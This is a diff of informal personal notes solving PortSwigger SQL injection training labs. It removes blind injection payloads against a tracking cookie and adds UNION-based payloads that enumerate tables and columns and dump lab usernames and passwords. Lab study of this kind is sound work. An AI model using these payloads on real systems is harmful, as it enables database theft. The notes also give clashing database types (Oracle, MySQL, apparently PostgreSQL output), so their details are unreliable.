@@ -1,40 +1,48 @@
---Name: Blind SQL injection with conditional responses
---URL: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
---Level: Medium Time: 15 min
+--Name: SQL injection attack, listing the database contents on Oracle
+--URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
+--Level:Medium Time: 15 min
 ---------------------------------------------------------------------------------
 
 -- Objective: log in as the administrator user.
+-- DB Type: MySQL
 
--- Cookie name: TrackingId
--- Cookie value: UDI6pcKX6GYtrI52
-
-
-SELECT ???? FROM ???? WHERE TrackingId = 'LwmU2CrkGTmKeDm2' AND '1'='1    '???--    OK  Message ON
-SELECT ???? FROM ???? WHERE TrackingId = 'LwmU2CrkGTmKeDm2' AND '1'='2    '???--    OK  essage OFF
-
-SELECT ???? FROM ???? WHERE TrackingId = 'LwmU2CrkGTmKeDm2' AND (SELECT 'a' FROM users LIMIT 1) = 'a  '???--    OK  Message ON 
--- meaning --
--- Users table is available
---------------------------
+SELECT * FROM products WHERE category = 'Gifts'--%20 ???
+SELECT * FROM products WHERE category = 'Gifts' ORDER BY 1--%20 ???     OK
+SELECT * FROM products WHERE category = 'Gifts' ORDER BY 2--%20 ???     OK
+SELECT * FROM products WHERE category = 'Gifts' ORDER BY 3--%20 ???     Error
 
 
-SELECT ???? FROM ???? WHERE TrackingId = 'LwmU2CrkGTmKeDm2' AND (SELECT 'a' FROM users WHERE username='administrator' LIMIT 1) = 'a  '???--    OK  Message ON 
--- meaning --
--- "administrator" exists in the Users table as a username
---------------------------
+SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT NULL, NULL, Null, Null, NULL, NULL--%20 ???    OK
+SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT 's', NULL--%20  ???    OK
+SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT NULL, 's'--%20  ???    OK
+
+SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT 'Our Data', CONCAT(TABLE_NAME,' - ',TABLE_TYPE) FROM information_schema.tables WHERE TABLE_TYPE = 'BASE TABLE'--%20  ???    Success
+-- tabel name   -   tabel type
+-------------------------------
+-- users_yskaeo - BASE TABLE
+-------------------------------
+-- pg_user_mapping - BASE TABLE
+-------------------------------
 
 
-SELECT ???? FROM ???? WHERE TrackingId = 'LwmU2CrkGTmKeDm2' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1) = 'a  '???--    OK  Message ON 
--- meaning --
--- the password lenght is bigger than 1 (obvusily it's gonna be bigger than 1 charachter, Stupid).
--- keep addding to the nubmber until the indecation stop working.
--- that number will be your password leangth.
--- the password is 19 letter :(
---------------------------
 
-ELECT ???? FROM ???? WHERE TrackingId = 'LwmU2CrkGTmKeDm2' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a    '???-- 
--- using substring to baiscly get one letter/charachter to examin it substring(Srting, Start, length).
--- And then you try to get the password leter by leter and check if it's the letter you did enter.
--- so basicly you need to try every Fucking possibility for every Fucking letter there is.
--- You know what that means right?!.. That means go create a Fucking script to do it, Dummy.
---------------------------
+SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT 'Our Data', CONCAT(COLUMN_NAME,' - ',DATA_TYPE) FROM information_schema.columns WHERE table_name = 'users_yskaeo'--%20 ???    Success
+-- Column name   -   Column type
+-------------------------------
+-- username_nlymtk - character varying
+-------------------------------
+-- password_oegdic - character varying
+-------------------------------
+
+
+
+SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT 'Our Data', CONCAT(username_nlymtk,' - ',password_oegdic) FROM users_yskaeo--%20 ???    Solved
+
+-- User   -  Password
+-------------------------------
+-- wiener - 2dewz1614y9kdbbbsut3
+-------------------------------
+-- carlos - kilaedt7tf8ct6sk2h7j
+-------------------------------
+-- administrator - f7gg1ve4xvpevi0i8y5w
+-------------------------------
